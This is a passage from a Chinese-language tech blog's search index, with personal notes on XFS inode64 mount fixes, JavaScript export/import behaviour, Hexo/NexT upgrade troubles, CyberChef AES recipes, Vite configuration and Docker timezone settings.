(virtual office) presented as a 16-bit RPG video game](https://github.com/thecodingmachine/workadventure)\n\n\n未來有空找個 Word 模板\n[Generate documents from a Word template with Docx4j on Wildfly](https://rieckpil.de/howto-generate-documents-from-word-templates-with-docx4j-on-wildfly-14/)\n[blog-tutorials/generate-documents-from-word-templates-with-docx4j-on-wildfly14 at master · rieckpil/blog-tutorials](https://github.com/rieckpil/blog-tutorials/tree/master/generate-documents-from-word-templates-with-docx4j-on-wildfly14)","tags":["word"],"categories":["實用工具"]},{"title":"Spring Boot 設定啟動時 Banner","url":"%2Fblog%2F2021%2F06%2F14%2FSpring-Boot-%E8%A8%AD%E5%AE%9A%E5%95%9F%E5%8B%95%E6%99%82-Banner%2F","content":"\n最近再找Spring Boot 設定動態網址\n突然看到這篇文章 [SpringBoot | 番外：使用小技巧合集-阿里云开发者社区](https://developer.aliyun.com/article/669697)\n覺得還滿有趣的\n\n<!--more-->\n\n放 banner.jpg,banner.png 到 resource/底下\n就會啟動時候，就會顯示\n\n但不是每個圖示都適合\n建議要有外框包住文字會比較適合\n所以能放什麼萌圖是不可能的\n\n稍微測試一下，幾乎一半的圖都不適合\n\n彩蛋:\n[Spring Boot Vue Axios 實現前後端分離的跨域訪問（CORS） - IT Skills 波林 Polin WEI - 資訊工作者的技術手札](https://polinwei.com/spring-boot-vue-axios-cors-configuration/)","tags":["java"],"categories":["Spring Boot"]},{"title":"XFS 程式出現 no space left on device","url":"%2Fblog%2F2021%2F06%2F14%2FXFS-%E7%A8%8B%E5%BC%8F%E5%87%BA%E7%8F%BE-no-space-left-on-device%2F","content":"\n通常都知道使用空間滿了就放不了檔案\n但是很常漏掉 inode 滿了也放不了\n[系統上檔案數量限制 | 程式狂想筆記](https://malagege.github.io/blog/2021/06/02/%E7%B3%BB%E7%B5%B1%E4%B8%8A%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%E9%99%90%E5%88%B6/)\n這篇有特別紀錄\n最近我專案碰的機器有時候會遇到程式存檔案到某資料(裡面有很多小資料)\n\n<!--more-->\n\n\n最近爬到 1TB 會遇到 no space left on device\n**但這邊對回我目前使用 300GB 空間應該不太可能**\n不過這邊跟 SE 提交一下這個\n看能不能解決這個問題\n\n\n簡單來說，預設掛 XFS 都是以 inode32\n選用 inode64 就比較不會遇到問題\n\n## 解決方案文獻\n\n* [請教 XFS， JFS， UFS， EXT4， reiser 幾個檔案系統的問題 - \b摸鱼](https://www.mofish.work/thread/13977\n\n\n\n* [linux - XFS No space left on device - Stack Overflow](https://stackoverflow.com/questions/26036190/xfs-no-space-left-on-device)\n\n指細看一下這篇，好像這篇也不到 1TB\n\n> There is a bug with xfs_growfs which causes inodes to not be properly distributed across a partition. The solution is to simply remount with the inode64 option. For example, if this was the /dev/vda1, you would do the following:\n\n```bash=\nmount -o remount,inode64 /dev/vda1\n```\n\n> You can find more information about the bug at the following link:\n\nhttp://xfs.org/index.php/XFS_FAQ#Q:_Why_do_I_receive_No_space_left_on_device_after_xfs_growfs.3F\n\n* [Linux XFS: \"no space left on device\"_weixin_33737774的博客-CSDN博客](https://blog.csdn.net/weixin_33737774/article/details/85073460)\n\n```\n[root@rhn ~]# mount -o remount,inode64 /var/satellite\n[root@rhn ~]# touch /var/satellite/a\n[root@rhn ~]# rm -rf /var/satellite/a\n```\n\n* [No space left on device on xfs filesystem with 2.4T _冰冻vs西瓜的技术博客_51CTO博客](https://blog.51cto.com/molewan/1703109)\n\n> 查询了下XFS FAQ，发现有一段：\n>\n> Q: What is the inode64 mount option for?\n>\n> By default, with 32bit inodes, XFS places inodes only in the first 1TB of a disk. If you have a disk with 100TB, all inodes will be stuck in the first TB. This can lead to strange things like \"disk full\" when you still have plenty space free, but there's no more place in the first TB to create a new inode. Also, performance sucks.\n>\n> To come around this, use the inode64 mount options for filesystems >1TB. Inodes will then be placed in the location where their data is, minimizing disk seeks.\n> \n> Beware that some old programs might have problems reading 64bit inodes, especially over NFS. Your editor used inode64 for over a year with recent (openSUSE 11.1 and higher) distributions using NFS and Samba without any corruptions, so that might be a recent enough distro.\n> \n> \n> 大意就是xfs文件系统会把inode存储在磁盘最开始的这1T空间里，如果这部分空间被完全填满了，那么就会出现磁盘空间不足的错误提示了。\n> \n> 查看mount的man帮助手册，可以看到如下内容：\n\n* [XFS文件系统报No space left on device 如何解决？ - 问答 - 云+社区 - 腾讯云](https://cloud.tencent.com/developer/ask/23438)\n\n>    嘗試重新掛載：`mount -o remount -o noatime,nodiratime,inode64,nobarrier /dev/vdc1 /data`\n> ext3文件系統使用inode table存儲inode信息，而xfs文件系統使用B+ tree存儲。考慮到性能問題，默認情況下這個B+ tree只會使用前1TB空間，當這1TB空間被寫滿後，就會導致無法寫入inode信息，報No spece left on device錯誤。在mount時，指定inode64即可將這個B+ tree使用的空間擴展到整個文件系統。\n\n\n* [Linux超实用逻辑卷缩容与扩容亲自实操！ - 邓红 - 博客园](https://www.cnblogs.com/DanHog/p/13457291.html)\n* [解决XFS文件系统NFS输出Stale NFS file handle错误 – 月与灯依旧](https://www.zhukun.net/archives/8025)\n\n> 解決辦法：\n1，掛載XFS分區時，記得添加inode64參數。否則會默認使用inode32來掛載。\n2，本地目錄通過NFS export時，記得添加fsid=XX參數。\n\n這篇還比較特別，提除另外一個第二解，但我不知道有沒有用。\n\n[備份圖](https://i.imgur.com/ABk902m.png)\n\n\n## 不錯文章\n\n逛到不錯文章，特別留紀錄\n留紀錄\n\n* [目录中文件过多导致ls命令卡住 - 简书](https://www.jianshu.com/p/353a5dbcd423)\n\n> 遍歷EXT3/4文件系統花這麼長時間和這麼多資源有時被認為是文件系統Bug。但是我個人認為，如果有Bug的話，那只能是遍歷軟件的Bug（比如，find命令、不帶-1和-f標識的ls命令以及各種備份軟件），而不是文件系統的Bug。\n\n作者：Maslino\n链接：https://www.jianshu.com/p/353a5dbcd423\n来源：简书\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n這邊為什麼會看到很多人用 find 去解決 ls 問題\n\n\n* [Linux 支援的檔案系統小評測-liuake-ChinaUnix博客](http://m.blog.chinaunix.net/uid-573799-id-2091461.html)\n\n* [关于XFS文件系统的一个问题](https://groups.google.com/g/zh-kernel/c/7qlx4az_yDg)\n\n\n- [xfs vs ext4 性能压测对比 - 云+社区 - 腾讯云](https://cloud.tencent.com/developer/article/1460643)\n\n```\n可能的空间满报错\n\n如果大家在网上搜索xfs的文章可能会搜到磁盘空间剩余很多，但是却报错空间不足的问题，大意就是xfs文件系统会把inode存储在磁盘最开始的这1T空间里，如果这部分空间被完全填满了，那么就会出现磁盘空间不足的错误提示了。解决办法就是在挂载时，指定 inode64 选项：\n\nmount -o remount -o noatime,nodiratime,inode64,nobarrier /dev/sdb1 /backup\n\n这个在内核3.7以后的版本 已经解决了。其实默认defaults 挂载参数是\n\n    (rw,noatime,attr2,inode64,sunit=128,swidth=512,noquota)\n```\n\n\n[为什么CENTOS 7.0开始选择XFS作为默认的文件系统？XFS相比ext有什么优点？ - 知乎](https://www.zhihu.com/question/24413471)\n[linux 文件系统 xfs, ext4 的区别 - 简书](https://www.jianshu.com/p/b775498ed1f5)\n[EXT4与XFS文件系统对I/O的影响_BK_sys的博客-CSDN博客](https://blog.csdn.net/BK_sys/article/details/112582264)","tags":["storage"],"categories":["Linux"]},{"title":"JS export 用法筆記","url":"%2Fblog%2F2021%2F06%2F14%2FJS-export-%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98%2F","content":"\n之前有研究 export 要怎麼使用\n不過後來沒特別記筆記\n最近碰 Vite 稍微完一下 Vue3\n發現有點忘記 export 怎麼用\n稍微回顧一下，好險有想起來\n[完全解析 JavaScript import、export | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/development/2020/03/25/import-export/)\n還是推薦看大神的文章\n我這邊是給自己看的筆記\n\n\n\n<!--more-->\n\n## export default\n\n這個我覺得最容易搞懂\n首先，常常看到 js 前面都會寫 \n\n`import xxx from 'xxx'`\n\n>  這邊注意 export default 吃不到 以下方式\n> `import {fn1,fn2} from 'xxx'`\n> 這很重要，這很重要，這很重要，我講三遍(我應該很容易搞混)\n> 下面會做詳細說明\n\n相對我們的.vue檔案\n會有一個設定\n```javascript=\nexport default {\n    fn1,\n    fn2\n}\n```\n這邊你會不會覺得放名子進去沒有做甚麼?\n這邊其實用到\n\n可以用另外一隻 js 呼叫 這隻 js\n用\n`import hello from 'xxx'`\nPS:`hello.fn1()`,`hellofn2()` \n\n>  這邊注意 export default 吃不到 以下方式\n> `import {fn1,fn2} from 'xxx'`\n> 這很重要，這很重要，這很重要，我講三遍(我應該很容易搞混)\n> 下面會做詳細說明\n> 我寫這篇時候，一直以為可以\n\n## export named\n\n**這邊會有兩種形式寫法**\n\n其實之前看，漏看到這段\n看到很多套件沒有寫 export default\n好像都是用 `export function aaa(){...}` 居多\n但其實用法比較彈性\n\n### export xxx named\n\n這邊 xxx 可以換成 var,const, let, function \n\n就我上面的範例\n\n```javascript=\nconst getReports = () => console.log('getReports')\nexport {getRerports}\n```\n\n```javascript=\nimport {getReports} from './fetch.js'\n```\n\n### export {}\n\n[14 JavaScript ES6 - 物件縮寫object shorthand - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10206415)\n\n```\nexport {}\n```\n\n這邊舉一個範例\n\n```javascript=\n//fetch.js\nvar bb = function (){\n    console.log('hello')\n}\nexport {bb}\n//main.js \nimport api from './fetch.js'; // 不能這樣取值\n\nconsole.log(api)\n//Uncaught SyntaxError: import not found: default\n\n//main.js\nimport {bb} from './fetch.js';\n\nconsole.log(bb)\n// bb function \n```\n\n## `export {}` 跟 `export xxx named` 重複變數會出錯嗎?(會)\n\n其實到這邊我很好奇，`export {}` 跟 `export xxx named` 可以撞會出錯嗎\n先說議結論**會**\n\n```javascript=\n// fetch.js\nconst c = {bb }\n\nexport const d = {bb }\n\nexport {bb,c,d}\n// main.js\nimport api from './fetch.js';\n\nconsole.log(api)\n// Uncaught SyntaxError: duplicate export name 'd'\n```\n\n## export named 跟 export default 可共存?\n\n先說結論，**可以**。(其實他們就是兩個不同用法，後面會說)\n\n我目前嘗試使用 export named 和 export default 不衝突。\n\n上面使用看看就知道\n\n## export xxx named 和 export default 可共存?(重點)\n\n先說結論，可以。(其實他們就是兩個不同用法，後面會說)\n但 `import api from './fetch.js';`不是吃到 export named ，是吃**export default**\n是吃**export default**\n是吃**export default**\n~~因為我以為 export named 也能吃...~~\n因為我覺得很重要，所以講三遍(其實我覺得我會很容易忘掉)\n\n```javascript=\n//fetch.js\nconst c = {bb }\n\nexport const d = {bb }\n\n\nexport {bb,c}\n\nexport default {\n    addReport\n}\n\n// main.js\n\nimport api from './fetch.js';\n\nconsole.log(api)\n// api.addReport\n```\n\n拿掉 export default \n\n```javascript=\n//fetch.js\nconst c = {bb }\n\nexport const d = {bb }\n\n\nexport {bb,c}\n\n\n// main.js\n\nimport api from './fetch.js';\n\nconsole.log(api)\n// Uncaught SyntaxError: import not found: default\n```\n\n## import * as named 和 import xxxx (重要)\n\n~~剛開始我以為 * 是抓 export default~~\nimport * as named 是抓 `export named`\nimport xxx 是抓 `export default`\n\n有找到文獻\n\n[ModuleImport](https://esdiscuss.org/topic/moduleimport)\n\n```javascript=\nimport * as fs from \"fs\"; // importing the named exports as an object\nimport Dict from \"dict\";  // importing a default export, same as ever\n\n```\n\n## 感想\n\n我覺得 `export named` 和 `export default` 是不同的東西，這樣想就比較不會有問題\n因為我把`export`來看，以為他們都是有關連的\n實際操作，使用方式也不太一樣(import)\n動手做做看就知道了\n\n~~很多不是教學不說，其實是我自己腦補很多東西QQ~~\n\nMDN文件可以看\n[export - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export)\n\n\n\n","tags":["export"],"categories":["JavaScript"]},{"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法","url":"%2Fblog%2F2021%2F06%2F14%2FHexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%EF%BC%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95%2F","content":"\n最近升級到 node 14，遇到 Hexo 各種問題。雖然有升到 Hexo 4.2 來解決問題，不過還是遇到了一些問題，想說不影響畫面輸出就沒什麼關係，但讓我的網頁 404 就必需要解決了。\n\n<!-- more -->\n\n## 問題整理\n\n1. 上下頁數顯示不正常\n![](https://i.imgur.com/dRsW6UD.png)\n![](https://i.imgur.com/mjq89AZ.png)\n\n2. 執行跑出以下錯誤\n![](https://i.imgur.com/qSBoZw7.png)\n\n## 解決問題 1\n\n我有找到顯示 Hexo 錯誤方法。\n\n[解決 Hexo 在使用 Node.js 14 時的 Accessing non-existent property 'xxx' of module exports inside circular dependency 問題 - 好一則博](https://www.haoyizebo.com/posts/710984d0/)\n\n```bash=\nnpx cross-env NODE_OPTIONS=\"--trace-warnings\" hexo s\n```\n\n恩...，看不懂是什麼錯誤~~跳過~~\n設定 package.json 還是無法排除...\n所以先放棄\n\n後來爬了一下文章，是 NexT 舊版本問題造成的。升級上去就能解決。\n\n\n[extra space of menu in default _config.yml cause category unable to jump in menu because of %20 · Issue #1315 · theme-next/hexo-theme-next](https://github.com/theme-next/hexo-theme-next/issues/1315)\n\n就感快升級解決。可以參考[hexo-theme-next/UPDATE-FROM-5.1.X.md at master · theme-next/hexo-theme-next](https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/UPDATE-FROM-5.1.X.md)\n簡單來說，舊版的 Next Theme 不用刪掉，只要clone 新得資料夾，就選定新的資料夾主題，最後用 VScode 比較`_config.yml`檔案就能做簡單移轉。\n\n~~太久沒用了，都忘了當出怎麼搞這些畫面~~\n順便回想，當出怎麼設定東西\n\n這邊又遇到奇怪的東西，官方新版首頁也掛掉了...\n\n## 問題整理 2\n\n1. 出現不正確名稱~~WTF~~\n![](https://i.imgur.com/cQOr3A5.png)\n\n剛好網路上看到說找不到語系，預設會是德文\n解決方式：在hexo/_config.yml 的 language 設定`zh-\nTW` (大小寫要一致)\n![](https://i.imgur.com/e5THho8.png)\n\n```\nhexo clean\nhexo s\n```\n\n就能看到畫面正常了\n\n## 番外篇:Google Ads\n\n發現新版，NEXT 主題做到無侵入式修改主題\n我覺得還滿方便，可以來試試看。\n\n\n後來看報這篇[版更HEXO NEXT 6 → 8，以非侵入式修改整合AdSense、like coin、修正gitlab-ci文章更新時間錯誤的問題 | 只是個打字的](https://blog.typeart.cc/upgrade-nexo-next-6-to-8-and-integrate-adsense-like-button/)介紹[hsuanyi-chou/hexo-next-theme-integration: Hexo NexT主題 V8 懶人包 / Hexo NexT theme integrate google adSense & like coin button without intrusive modification template.](https://github.com/hsuanyi-chou/hexo-next-theme-integration)，這個可以快速使用無侵入方式設定Google Adsense，但我已經套用原官方主題，所以把這個`_data`抓下來使用，再把下面設定上去就可以咯\n\n設定參考[版更HEXO NEXT 6 → 8，以非侵入式修改整合AdSense、like coin、修正gitlab-ci文章更新時間錯誤的問題 | 只是個打字的](https://blog.typeart.cc/upgrade-nexo-next-6-to-8-and-integrate-adsense-like-button/)，建議去裡面看更完整內容\n\nnext/_config.yml\n```yaml=\n# ---------------------------------------------------------------\n# Custom Settings\n# ---------------------------------------------------------------\n# Google AdSense\ngoogle_adsense:\n  enable: false\n  google_ad_client_id: # <client id>\n  enable_page_level_ads: false\n  ## sidebar_enable\n  sidebar_enable: false\n  sidebar_data_ad_slot: # <slot id>\n  ## post header\n  postheader_enable: false\n  postheader_data_ad_slot: # <slot id>\n  ## post footer\n  postfooter_enable: false\n  postfooter_data_ad_slot: # <slot id>\n```\n\n這個在設定啟用\n\n```yaml=\ncustom_file_path:\n  #head: source/_data/head.njk\n  header: source/_data/header.njk\n  sidebar: source/_data/sidebar.njk\n  postMeta: source/_data/post-meta.njk\n  postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.njk\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n切記要把swig換成njk。\n\n\nPS: 舊版設定\n[hexo NexT主題增加AdSense | 只是個打字的](https://blog.typeart.cc/hexo%20NexT%E4%B8%BB%E9%A1%8C%E5%A2%9E%E5%8A%A0AdSense/)\n[NexT 使用文檔](https://theme-next.iissnan.com/)\n\n\n還有不少錯誤，但至少可以跑...\n先讓子彈飛一會兒\n也許砍掉重練會比較快XD","tags":["next"],"categories":["Hexo"]},{"title":"Hexo 升級 nodejs 14 產出 0kb 檔案問題","url":"%2Fblog%2F2021%2F06%2F03%2FHexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C%2F","content":"\n\n最近玩 Vite Nodejs 升級到 14\n最近寫 Hexo 時候發現竟然部暑到 Github 都空白\n我還以為我 Markdown 有問題\n後來 rollback 回去上一版也是一樣\n最後發現是 Github 佈署檔案 html 為 0kb\n瞬間傻了...\n\n好險，我Git基本知識還行\n退回先前版本回去\n\n<!--more-->\n\n爬了很久我發現是 NodeJs 問題\n參考: [解决hexo generate 生成的时候index.html为0kb空白的问题 | TonyStudio](https://blog.tcs-y.com/2020/04/26/hexo-index-0kb/)\n\n但我發現我轉到 NodeJS 12 發現還是不能\n[hexo 生成的 html 文件为空的问题 · Alan Lee](https://alanlee.fun/2021/02/28/hexo-empty-html/)\n\n> 不成功的话把public文件夹删了重新生成。 这个坑真是大。。。\n\n沒想到這個真的能解決我問題，不知道為什麼 public 刪掉就正常\n\n\n記得我同學推薦 n 比 nvm 好用\n但發現 n 好像不能支援 windows\n只好用 nvm(去官方抓release setup版本)\n\n[Windows 10 安裝並使用 nvm 切換 NodeJS 版本 | Welcome.Web.World](https://hsiangfeng.github.io/nodejs/20200107/3738078915/)\n\n## 嘗試升級到 4.2\n\n最近玩 Vite ，我發現還滿有趣的\n應該不會移除\n一直切換 hexo 不是個好方法\n所以我就嘗試看看升級 4.2\n\n```json=\n  \"dependencies\": {\n    \"hexo\": \"^4.2.0\",\n    \"hexo-deployer-git\": \"^0.3.1\",\n    \"hexo-generator-archive\": \"^0.1.4\",\n    \"hexo-generator-category\": \"^0.1.3\",\n    \"hexo-generator-index\": \"^0.2.0\",\n    \"hexo-generator-searchdb\": \"^1.0.8\",\n    \"hexo-generator-tag\": \"^0.2.0\",\n    \"hexo-renderer-ejs\": \"^0.3.0\",\n    \"hexo-renderer-marked\": \"^0.3.0\",\n    \"hexo-renderer-stylus\": \"^0.3.1\",\n    \"hexo-server\": \"^0.2.0\"\n  }\n```\n\n```\nnpm install\n```\n\n不想升到5版，好像有些設定檔案要調整\n哪天迫不得以再說:|\n\n## 其他\n\n[Hexo + github actions 自動化部署 | Winnie's blog](https://op30132.github.io/2020/02/05/github-action/)\n","tags":["hexo"],"categories":["Hexo"]},{"title":"查看 docker compose 看 volume 方法","url":"%2Fblog%2F2021%2F06%2F03%2F%E6%9F%A5%E7%9C%8B-docker-compose-%E7%9C%8B-volume-%E6%96%B9%E6%B3%95%2F","content":"\n# 查看 docker compose 看 volume 方法\n\n\n一直以為 docker-compose volume /inspect\n但發現沒有這個功能\n\n<!--more-->\n\n[docker-compose inspect · Issue #4155 · docker/compose · GitHub](https://github.com/docker/compose/issues/4155)\n\n[How do you list volumes in docker containers? - Stack Overflow](https://stackoverflow.com/questions/30133664/how-do-you-list-volumes-in-docker-containers)\n\n看來用 portainer 會比較快\n\n\n有更好的方法，會再補充","tags":["volume"],"categories":["Docker"]},{"title":"線上解AES好用工具","url":"%2Fblog%2F2021%2F06%2F02%2F%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7%2F","content":"\n平常使用API都需要複雜AES加解密轉Base64\n導致測試API都很麻煩\n今天找到幾個好用的網站\n整理一下\n\n<!--more-->\n\n\n1. [AES decryption AES encryption AES Hex Key Supported - The X Online Tools](https://the-x.cn/en-us/cryptography/Aes.aspx)\n\n\n2. [CyberChef](https://gchq.github.io/CyberChef/)\n\n這個可以客製化很多東西\n\nAES加解密中文Base64就發現不能顯示出來\n後來研究出方法\n\n~~加密中文出來~~中文沒法加密無法解出中文，但英文不會有問題\n暫時先用上面的網站來解決\n[Encode text, AES Encrypt, To Base64 - CyberChef](https://pse.is/3heuwe)\n```\nhttps://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-8%20(65001)')AES_Encrypt(%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')&input=YWJj5Lit5paHYWJj\n```\n\n解中文出來，後面加 decode text UTF-8 就正常了...\n\n\n[From Base64, AES Decrypt, Decode text - CyberChef](https://pse.is/3h5dpr)\n\n```\nhttps://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Decode_text('UTF-8%20(65001)')&input=QnEvc2xmcFAxSWR1YTFwUXNOV0hHUT09\n```\n## 翻外篇   CyberChef  強大好用的工具\n\n### 抓取Email，去除重覆\n\n[Extract email addresses, Unique - CyberChef](https://pse.is/3hn2a2)\n\n```\nhttps://gchq.github.io/CyberChef/#recipe=Extract_email_addresses(false)Unique('Line%20feed')&input=ZmZmZkBmZmYuY29tCmRkZGRAZmZmLmNvbSwgeHh4eEBmZmZmLmNvbQpmZmZmQGZmZi5jb20KZmZmZkBmZmYuY29t\n```\n\n維運很常需要做這些東西，我就不需要在 Sublime 抓出 Email 到 Excel 去除重覆\n\n### 字串包 \",' 符號\n\n\n<a href=\"https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false/disabled)Unique('Line%20feed')Find_/_Replace(%7B'option':'Regex','string':'(.%2B)'%7D,'%5C'$1%5C',',true,false,true,false)Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)')\">Extract IP addresses, 3 more - CyberChef</a>\n\n```\nhttps://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false/disabled)Unique('Line%20feed')Find_/_Replace(%7B'option':'Regex','string':'(.%2B)'%7D,'%5C'$1%5C',',true,false,true,false)Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)')\n```\n\n常常有大量資料查詢，都靠Sublime Text去做，有時候大量資料會當機，但用這個也能做到一樣的效果，還能做去除、排序\n\n","tags":["aes"],"categories":["實用工具"]},{"title":"使用 Vite 初體驗","url":"%2Fblog%2F2021%2F06%2F02%2F%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n我很久沒寫Vue\n都忘記差不多\n最近想寫一個小東西\n有聽過一場Vite研討會\n覺得很方便，就來使用看看\n\n\n<!--more-->\n\n[vite2: Make Web Dev Fast Again & Again. – Dropbox Paper](https://paper.dropbox.com/doc/vite2-Make-Web-Dev-Fast-Again-Again.-9DcJOLb0spaYNbCbF6Zqd)\n\n裡面dev proxy，還滿方便的\n但不能做CROS 方法\n這邊想成`npm run dev` 時候，進去  /api/ 時候會倒 proxy server\n測試時候很方便\n\n除了上面教學\n\n這邊還滿多 Vite 文章\n[标签：vite - Fidel Yiu | 前端技术博客](https://www.kuxiaoxin.com/tags/vite)\n\nVite PWA\n[第六十章-Vite插件-vite-plugin-pwa - Fidel Yiu | 前端技术博客](https://www.kuxiaoxin.com/archives/75)\n\n但我後來源參照這篇\n\n官方設定好像不是這樣(不知道是不是舊版的文)\n設定非常簡單\n\n```javascript= vite.config.js\nimport { defineConfig } from 'vite'\nimport vue from '@vitejs/plugin-vue'\nimport { VitePWA } from 'vite-plugin-pwa'\n\n// https://vitejs.dev/config/\nexport default defineConfig({\n\n  server: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:8080/api',\n        // changeOrigin: true,\n        rewrite: path => path.replace(/^\\/api/, '')\n      }\n    }\n  },\n  plugins: [vue(),VitePWA({\n    registerType: 'autoUpdate',  \n    manifest: {\n      \"name\": \"XXXX\",\n      \"short_name\": \"XXXX\",\n      \"start_url\": \".\",\n      \"display\": \"standalone\",\n      \"background_color\": \"#fff\",\n      \"description\": \"XXXX\",\n      \"icons\": [ {\n        \"src\": \"images/android-launchericon-48-48.png\",\n        \"sizes\": \"48x48\",\n        \"type\": \"image/png\"\n      },{\n        \"src\": \"images/android-launchericon-72-72.png\",\n        \"sizes\": \"72x72\",\n        \"type\": \"image/png\"\n      },{\n        \"src\": \"images/android-launchericon-144-144.png\",\n        \"sizes\": \"144x144\",\n        \"type\": \"image/png\"\n      },{\n        \"src\": \"images/android-launchericon-192-192.png\",\n        \"sizes\": \"192x192\",\n        \"type\": \"image/png\"\n      },{\n        \"src\": \"images/android-launchericon-512-512.png\",\n        \"sizes\": \"512x512\",\n        \"type\": \"image/png\"\n      }]\n    },\n    workbox: {\n      // workbox options for generateSW\n    }\n  })]\n})\n\n```\n\n## Vite 使用環境變數\n\n設定 Vite 環境變數需要注意幾個事情\n\n1. .env 可以使用 Vite 環境變數\n  這邊提下小重點\n  > .env                # 所有情況下都會加載\n  > .env.local          # 所有情況下都會加載，但會被 git 忽略\n  > .env.[mode]         # 只在指定模式下加載\n  > .env.[mode].local   # 只在指定模式下加載，但會被 git 忽略\n\n  這邊.env.local會被 git 忽略，後來發現是 `.local` 都會被 git 忽略。\n  至於為什麼能被 git 忽略？因為建立 Vite 時候就已經被被在 `.gitignore`。~~我還以為 git 就有這個預設差點高潮~~\n\n2. .env 環境變數需要用 `VITE_`開頭\n```\nDB_PASSWORD=foobar\nVITE_SOME_KEY=123\n```\n\n使用變數也是很簡單，用 `import.meta.env.*` 就可以抓出環境變數\n仔細一看，這個一般 js 也能使用\n\n- [环境变量和模式 | Vite 官方中文文档](https://cn.vitejs.dev/guide/env-and-mode.html#env-files)\n- [import.meta - JavaScript | MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/import.meta)\n- [vue-cli 遷移 vite2 實踐小結 - SegmentFault 思否](https://segmentfault.com/a/1190000039371430)\n### 選擇環境變數編譯\n\n```bash\nvite build --mode staging\n```\n\n假如 vite 沒用在全域變數時候，可以用`npm run build -- --mode test`，這樣就不用在`package.json`做修改調整\n參考: [如何向npm腳本發送命令行參數？ - 問答 - 雲+社區 - 騰訊雲](https://cloud.tencent.com/developer/ask/50047)\n\n這邊假如有指定 mode 時候，我這邊有做實驗，環境套用順序是這樣 `.env`->`.env.local`->`.env.test`\n\n\n### 其他使用方式\n\n\n- [【 Node.js 】利用 .env 與環境變數隱藏敏感資訊](https://learningsky.io/use-environmental-variables-to-hide-sensitive-information/)\n- [vite.config.ts基础配置分享 - SKILL.NULL](https://skillnull.com/20200924/vite-config-ts%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E5%88%86%E4%BA%AB/)\n```js\n// Dotenv 是一个零依赖的模块，它能将环境变量中的变量从 .env 文件加载到 process.env 中\nconst dotenv = require(\"dotenv\")\n \nconst envFiles = [\n  /** default file */ `.env`,\n  /** mode file */ `.env.${process.env.NODE_ENV}`\n]\n \nfor (const file of envFiles) {\n  const envConfig = dotenv.parse(fs.readFileSync(file))\n  for (const k in envConfig) {\n    process.env[k] = envConfig[k]\n  }\n}\n```\n\n","tags":["vite"],"categories":["Vue"]},{"title":"ICON 快速產生小記","url":"%2Fblog%2F2021%2F06%2F02%2FICON-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%B0%8F%E8%A8%98%2F","content":"\n最近簡單做一個PWA\n但是一次要產生各種大小的圖\n~~我覺得好麻煩~~\n\n<!--more-->\n\n這邊找到幾個網路上找到得資源\n\n<!--more-->\n\nAndroid 可用\n\n[PWABuilder](https://www.pwabuilder.com/imageGenerator)\n\n這邊決 IOS\n\nIOS 可用\n\n[App Icon Generator](https://appicon.co/)\n\n我邊是用 180px\n\n其他\n\n[Android Asset Studio - Launcher icon generator](https://romannurik.github.io/AndroidAssetStudio/icons-launcher.html#foreground.type=clipart&foreground.clipart=android&foreground.space.trim=1&foreground.space.pad=0.25&foreColor=rgba(96%2C%20125%2C%20139%2C%200)&backColor=rgb(68%2C%20138%2C%20255)&crop=0&backgroundShape=square&effects=none&name=ic_launcher)\n\n參考來源:\n[mobile safari - PWA icons are not used in iOS 11.3 - Stack Overflow](https://stackoverflow.com/questions/49568333/pwa-icons-are-not-used-in-ios-11-3)\n\n","tags":["ios"],"categories":["實用工具"]},{"title":"Docker 修改時區方法","url":"%2Fblog%2F2021%2F06%2F02%2FDocker-%E4%BF%AE%E6%94%B9%E6%99%82%E5%8D%80%E6%96%B9%E6%B3%95%2F","content":"\n比較常在網路上看到\n\n<!--more-->\n\n```yaml\nvolumes: \n  - \"/etc/localtime:/etc/localtime:ro\"\n```\n\n但測試 Java Container發現沒有成功\n後來使用下面方法就成功了\n\n```yaml\n    environment: \n      - \"TZ=Asia/Taipei\"\n```\n\n參考:\n\n[設定 Docker Container 與 Host 相同時區的方法](https://www.arthurtoday.com/2016/07/how-to-setup-docker-container-timezone-host.html)\n\n[[筆記] 修改 docker 容器內的時區 - Change Timezone in Docker | 